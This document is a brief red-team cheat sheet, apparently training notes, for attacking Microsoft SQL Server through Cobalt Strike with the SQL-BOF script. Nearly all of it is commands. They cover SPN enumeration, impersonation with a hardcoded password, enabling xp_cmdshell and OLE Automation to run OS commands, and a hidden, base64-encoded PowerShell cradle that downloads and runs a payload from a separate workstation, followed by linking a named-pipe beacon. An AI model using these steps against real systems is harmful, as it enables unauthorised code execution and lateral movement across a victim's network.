# SQL Server attacks with CS

### SQL-BOF

Load the SQL-BOF Aggressor script.&#x20;

1\. Go to **Cobalt Strike > Script Manager**.&#x20;

2\. Click **Load**.&#x20;

3\. Select _C:\Tools\SQL-BOF\SQL\SQL.cna_.

### Search for MSSQL servers configured with kerberos authentication

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
name: MSSQL Service
sAMAccountName: mssql_svc
servicePrincipalName: MSSQLSvc/abc-db-1.contoso.com:1433, MSSQLSvc/abc-db-1.contoso.com
retreived 1 results total
```

Get information about the server

```
sql-info abc-db-1
sql-whoami abc-db-1
```

impersonate sysadmin user

```
make_token CONTOSO\capple Passw0rd!
```

### XP cmdshell

Look for xp cmdshell

```
sql-query abc-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

Enable xp cmdshell

```
sql-enablexp abc-db-1
```

Exec commands xp cmdshell

```
sql-xpcmd abc-db-1 "hostname && whoami"
sql-disablexp abc-db-1
```

#### OLE Automation

**No output is returned** Enumerate OLE Automation

```
sql-query abc-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
```

Enable OLE Automation

```
sql-enableole abc-db-1
```

Command execution

```
$cmd = 'iex (new-object net.webclient).downloadstring("http://abc-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

sql-olecmd abc-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"

link abc-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

sql-disableole abc-db-1
```

